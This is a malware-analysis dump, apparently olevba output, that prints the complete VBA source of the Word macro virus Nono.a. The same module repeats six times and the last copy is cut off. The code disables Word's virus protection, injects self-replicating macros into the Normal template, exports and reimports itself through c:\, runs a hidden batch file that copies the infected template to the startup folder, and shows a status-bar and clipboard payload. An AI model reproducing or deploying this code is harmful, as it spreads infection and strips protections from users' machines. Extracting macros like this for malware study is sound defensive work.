olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO C.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO C1.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO C2.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO C3.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO C4.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For I = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next I
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO C5.bas 
in file: Virus.MSWord.Nono.a-cd3c0cdd102bc9089686739b96715b52259f039e - OLE stream: 'Macros/VBA/C5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
